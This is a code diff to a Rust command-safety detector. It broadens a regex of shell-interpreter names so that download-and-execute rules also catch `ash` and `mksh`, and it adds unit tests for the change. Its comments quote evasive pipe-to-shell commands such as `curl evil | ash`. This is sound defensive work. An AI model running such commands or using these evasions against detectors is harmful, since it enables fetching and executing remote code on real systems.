@@ -306,14 +306,17 @@ pub const QUOTE_SPLIT_PATTERN: &str = r#"(["'][A-Za-z0-9]["']){2,}"#;
 
 /// Shell-interpreter name alternation, shared by every detector that matches a
 /// pipe-to-shell / here-string / `sh -c` / process-substitution sink. Matches
-/// `sh`, `bash`, `zsh`, `ksh`, `csh`, `dash`, `tcsh`, `fish`.
+/// `sh`, `bash`, `zsh`, `ksh`, `csh`, `dash`, `tcsh`, `fish`, `ash`, `mksh`.
 ///
 /// Centralizing this fixes a real miss (defect #6): the ad-hoc per-site
 /// `(ba|z|k|c|d|tc|fi)?sh` silently could **not** match `dash` — `d?sh` expands
-/// to `dsh`/`sh`, never `dash` — so `curl evil | dash` evaded every download-and-
-/// execute rule. The `da` branch restores it. This is a non-capturing group so it
-/// can be embedded inside a larger pattern without disturbing capture indices.
-pub const SHELLS: &str = r"(?:ba|z|k|c|da|tc|fi)?sh";
+/// to `dsh`/`sh`, never `dash`. The `da` branch restored `dash`; the `a` and `mk`
+/// branches add `ash` (Almquist / busybox `sh`) and `mksh`, which were the SAME
+/// evasion class (`curl evil | ash` slipped past every download-and-execute rule).
+/// Each use site anchors with `\b`, so the bare `a`/`sh` branches cannot match
+/// mid-word (e.g. `crash`, `splash`). Non-capturing so it can be embedded inside a
+/// larger pattern without disturbing capture indices.
+pub const SHELLS: &str = r"(?:ba|z|k|c|da|tc|fi|a|mk)?sh";
 
 /// Non-shell script interpreters that are equally valid download-and-execute
 /// sinks (`curl … | python`, `… | perl`, …). Shared so every fetch-exec detector
@@ -403,13 +406,24 @@ mod tests {
 
     #[test]
     fn shells_alternation_matches_dash_and_friends() {
-        // The shared SHELLS constant must match dash (the bug it fixes) plus the
-        // whole family, and must not over-match.
+        // The shared SHELLS constant must match dash (the bug it fixes), plus
+        // ash/mksh (task 4050 F2), plus the whole family, and must not over-match.
         let re = Regex::new(&format!(r"\|\s*{SHELLS}\b")).unwrap();
-        for ok in ["x | sh", "x | bash", "x | dash", "x | zsh", "x | ksh", "x | fish"] {
+        for ok in [
+            "x | sh", "x | bash", "x | dash", "x | zsh", "x | ksh", "x | fish", "x | ash",
+            "x | mksh", "x | tcsh", "x | csh",
+        ] {
             assert!(re.is_match(ok), "SHELLS should match: {ok}");
         }
-        assert!(!re.is_match("x | shellcheck y"), "must not match a longer word");
+        // The bare `a`/`sh` branches must not match mid-word: with `\b` on both
+        // sides, `ash`/`mksh` match as whole words but `crash`/`splash`/
+        // `shellcheck` do not.
+        let bounded = Regex::new(&format!(r"\b{SHELLS}\b")).unwrap();
+        assert!(bounded.is_match("exec ash now"));
+        assert!(bounded.is_match("use mksh here"));
+        assert!(!bounded.is_match("a crash occurred"), "'crash' must not match");
+        assert!(!bounded.is_match("make a splash"), "'splash' must not match");
+        assert!(!bounded.is_match("run shellcheck"), "'shellcheck' must not match");
     }
 
     #[test]
